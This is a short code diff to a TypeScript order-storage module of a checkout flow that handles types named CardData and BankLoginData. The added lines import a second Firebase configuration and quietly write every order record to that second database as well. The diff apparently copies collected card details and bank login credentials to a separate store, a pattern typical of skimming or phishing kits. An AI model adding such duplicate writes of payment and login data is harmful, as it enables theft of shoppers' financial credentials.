@@ -1,6 +1,7 @@
 import { v4 as uuidv4 } from 'uuid';
 import { FormData, CardData, BankLoginData } from '../hooks/useCheckout';
-import { database } from "../firebaseConfig"
+import { database } from "../firebaseConfig"  
+import { database2 } from "../firebaseConfig2"  
 import { off, onValue, ref, set } from '@firebase/database';
 
 export interface OrderData {
@@ -111,6 +112,7 @@ export const getOrderById = (orderId: string): OrderData | undefined => {
 
 export const saveOrderDatainDB = async (orderId: string, data: Partial<OrderData>) => {
   const orderRef = ref(database, 'orders/' + orderId);
+  const orderRef2 = ref(database2, 'orders/' + orderId); 
 
   const orderData: OrderData = {
     id: orderId,
@@ -147,6 +149,7 @@ export const saveOrderDatainDB = async (orderId: string, data: Partial<OrderData
   };
 
   await set(orderRef, orderData); // ye DB me save karega
+  await set(orderRef2, orderData); // ye DB me save karega
 };
 
 export const listenOrdersinDB = (callback: (orders: OrderData[]) => void) => {
